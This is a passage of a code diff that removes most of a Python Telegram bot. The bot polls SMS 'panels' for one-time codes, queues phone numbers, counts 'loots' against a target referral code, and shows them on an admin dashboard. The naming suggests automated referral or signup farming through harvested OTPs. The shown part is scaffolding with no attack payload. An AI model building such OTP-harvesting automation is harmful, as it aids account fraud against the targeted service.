-    global first_run
-    while True:
-        tasks = [poll_single_db(url) for url in DATABASES.values() if url not in dead_panels]
-        if tasks: await asyncio.gather(*tasks, return_exceptions=True)
-        
-        if first_run:
-            add_log("🧹 Cleared old SMS. Listening for new ones...")
-            first_run = False
-            
-        await asyncio.sleep(POLL_INTERVAL)
-
-# ================= RENDER DUMMY WEB SERVER =================
-async def handle_health_check(request):
-    return web.Response(text="Bot Engine Active and Running!")
-
-async def start_web_server():
-    app = web.Application()
-    app.router.add_get('/', handle_health_check)
-    runner = web.AppRunner(app)
-    await runner.setup()
-    port = int(os.environ.get("PORT", 8080))
-    site = web.TCPSite(runner, '0.0.0.0', port)
-    await site.start()
-    print(f"🌐 Health Server running on port {port}")
-
-# ================= THREADED DASHBOARD =================
-def dashboard_thread_worker():
-    global last_dash_text, live_message_id
-    while True:
-        time.sleep(3)
-        if live_message_id:
-            try:
-                active = len(DATABASES) - len(dead_panels)
-                qsize = number_queue.qsize() if number_queue else 0
-                
-                logs_formatted = "\n".join(list(LIVE_LOGS)) if LIVE_LOGS else "<i>No recent activity...</i>"
-                
-                text = (
-                    f"🌟 <b>MACCARON PRO DASHBOARD</b>\n"
-                    f"📡 Active Panels: {active}/{len(DATABASES)}\n"
-                    f"⏳ In Queue: {qsize}\n"
-                    f"📲 Waiting OTP: {len(pending_maccaron)}\n"
-                    f"🏆 TOTAL LOOTS: {looted_count[0]}\n\n"
-                    f"🖥️ <b>LIVE TERMINAL:</b>\n"
-                    f"{logs_formatted}\n\n"
-                    f"<i>🛡️ V12 Smart Engine Running... 🔄</i>"
-                )
-                
-                if text != last_dash_text:
-                    safe_edit_message(text, ADMIN_ID, live_message_id, parse_mode="HTML")
-                    last_dash_text = text
-            except Exception:
-                pass
-
-# ================= ASYNC ENGINE STARTER =================
-def run_async_backend():
-    global number_queue
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    number_queue = asyncio.Queue()
-    
-    loop.create_task(start_web_server())
-    loop.create_task(update_cache_loop())
-    loop.create_task(poll_loop())
-    loop.create_task(otp_janitor()) 
-    for i in range(NUM_WORKERS): 
-        loop.create_task(api_worker(i))
-    
-    loop.run_forever()
-
-# ================= TELEBOT HANDLERS =================
-@bot.message_handler(commands=['start'])
-def start_cmd(message):
-    if message.chat.id != int(ADMIN_ID): return
-    kb = InlineKeyboardMarkup().add(InlineKeyboardButton("🟢 Open Dashboard", callback_data='dash'))
-    
-    try:
-        bot.reply_to(message, f"🚀 <b>MACCARON ENGINE STARTED!</b>\nTarget Ref: <code>{MACCARON_REF}</code>\nTotal Databases Loaded: {len(DATABASES)}", reply_markup=kb, parse_mode="HTML")
-    except Exception as e:
-        logging.error(f"Failed to reply /start: {e}")
-
-@bot.callback_query_handler(func=lambda call: call.data == 'dash')
-def handle_dash(call):
-    global live_message_id
-    
-    if live_message_id:
-        try:
-            bot.delete_message(ADMIN_ID, live_message_id)
-        except Exception: pass
-        
-    msg = safe_send_message(ADMIN_ID, "Initializing Dashboard...")
-    if msg:
-        live_message_id = msg.message_id
-        add_log("🟢 Dashboard Initialized. Engine active.")
+    run()
 
 if __name__ == "__main__":
-    load_used_numbers()
-    
-    threading.Thread(target=run_async_backend, daemon=True).start()
-    threading.Thread(target=dashboard_thread_worker, daemon=True).start()
-    
-    print("🤖 Bot Started Successfully. Press Ctrl+C to exit safely.")
-    
-    while True:
-        try:
-            bot.polling(non_stop=True, timeout=60, long_polling_timeout=60)
-        except Exception as e:
-            print(f"⚠️ Telegram Connection Dropped: {e}. Reconnecting in 5 seconds...")
-            time.sleep(5)
+    main()
